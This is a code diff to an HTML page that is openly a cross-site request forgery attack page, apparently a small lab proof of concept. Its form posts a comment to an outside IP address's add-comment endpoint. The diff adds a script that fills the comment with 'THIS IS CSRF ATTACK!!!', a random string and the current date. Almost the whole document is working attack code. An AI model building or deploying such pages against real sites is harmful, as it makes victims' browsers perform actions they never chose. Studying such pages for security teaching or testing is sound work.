@@ -8,8 +8,23 @@
 
     <form name="attackform" action="http://8.222.202.241:8000/add-comment" method="post">
         <input type="hidden" name="post-id" value='1'>
-        <input type="text" name="comment-textarea" value="THIS IS CSRF ATTACK!!!" >
+        <textarea type="text" name="comment-textarea" id="random" value="" ></textarea>
         <button type="submit">submit</button>
     </form>
 </body>
+<script>
+    function randomString(length, chars) {
+        var result = '';
+        for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
+        return result;
+    }
+
+    let now = new Date();
+    let dateString = now.toString();
+
+    var random_attack = document.getElementById('random');
+    random_attack.value = 'THIS IS CSRF ATTACK!!! --- BY ' +  randomString(8, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
+
+    random_attack.value += " -- " + dateString;
+</script>
 </html>
